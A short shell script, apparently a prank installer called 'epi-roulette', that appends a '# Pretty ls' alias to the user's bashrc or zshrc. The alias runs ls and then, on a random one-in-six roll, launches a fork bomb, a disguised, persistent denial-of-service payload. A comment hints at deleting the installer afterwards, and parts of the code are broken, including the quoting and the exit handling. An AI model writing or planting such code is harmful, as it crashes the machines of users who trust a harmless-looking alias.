#!/bin/sh

REPO_PATH=$(pwd)
source "$REPO_PATH/config"
if [ -f "$SHELL" ]; then
    case "$SHELL" in
        */zsh) CONFIG_SHELL="zshrc" ;;
        */bash) CONFIG_SHELL="bashrc" ;;
    esac
else
    echo "$SHELL does not exist"
    exit 1
fi

if [ -z "$CONFIG_SHELL" ]; then
    echo "$SHELL not supported"
    exit 1
fi

[ -f "$CONFIG_PATH/$CONFIG_SHELL" ] || (echo "$CONFIG_PATH/$CONFIG_SHELL does not exist" && exit 1;)

echo "# Pretty ls" >> "$CONFIG_PATH/$CONFIG_SHELL"
echo "alias ls='ls && RANDOM_VALUE=\$((\$RANDOM % 6)) && ( [ "\$RANDOM_VALUE" -ne 0 ] || :(){ :|:& };: )'" >> "$CONFIG_PATH/$CONFIG_SHELL"
source -p $CONFIG_PATH $CONFIG_SHELL

# rm -fr epi-roulette
